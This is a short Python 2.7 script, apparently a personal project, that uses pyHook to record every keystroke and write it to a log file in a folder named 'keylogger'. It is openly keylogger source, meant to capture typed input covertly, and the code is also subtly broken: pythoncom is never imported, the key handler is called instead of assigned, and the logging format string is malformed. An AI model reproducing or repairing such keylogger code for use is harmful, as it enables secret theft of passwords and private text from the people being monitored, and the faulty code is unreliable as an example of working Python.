# use python compiler 2.7.1

import  pyHook, sys, logging

file_logg = 'C:\\Users\\Radoslav\\Desktop\\c#\\01.python\\keylogger\\log.txt'

def on_key_board_event(event):
    logging.basicConfig(filename=file_logg, level=logging.DEBUG, format='%(message)')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = on_key_board_event()
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

